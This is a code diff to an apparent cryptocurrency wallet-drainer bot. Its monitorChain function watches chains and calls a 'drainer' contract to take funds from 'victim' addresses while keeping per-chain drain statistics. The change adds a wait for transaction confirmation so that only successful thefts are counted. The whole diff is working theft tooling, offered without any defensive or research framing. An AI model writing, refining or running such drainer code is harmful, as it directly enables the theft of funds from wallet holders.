@@ -126,6 +126,7 @@ async function monitorChain(config) {
               console.log(`Balance: ${balance.toString()}`);
               
               try {
+                console.log(`🚀 Attempting drain...`);
                 const hash = await walletClient.writeContract({
                   address: drainer,
                   abi: DRAINER_ABI,
@@ -134,12 +135,21 @@ async function monitorChain(config) {
                   gas: 200000n
                 });
                 
-                console.log(`✅ DRAINED! TX: ${hash}`);
+                console.log(`📝 TX submitted: ${hash}`);
                 
-                processedDrains.set(drainId, Date.now());
-                stats.totalDrained++;
-                stats.lastDrain = new Date().toISOString();
-                stats.drainsByChain[chain.name] = (stats.drainsByChain[chain.name] || 0) + 1;
+                // Wait for confirmation
+                const receipt = await publicClient.waitForTransactionReceipt({ hash });
+                
+                if (receipt.status === 'success') {
+                  console.log(`✅ DRAINED! TX: ${hash}`);
+                  
+                  processedDrains.set(drainId, Date.now());
+                  stats.totalDrained++;
+                  stats.lastDrain = new Date().toISOString();
+                  stats.drainsByChain[chain.name] = (stats.drainsByChain[chain.name] || 0) + 1;
+                } else {
+                  console.log(`❌ TX reverted: ${hash}`);
+                }
                 
               } catch (error) {
                 console.error(`❌ Drain failed for ${victim}:`, error);
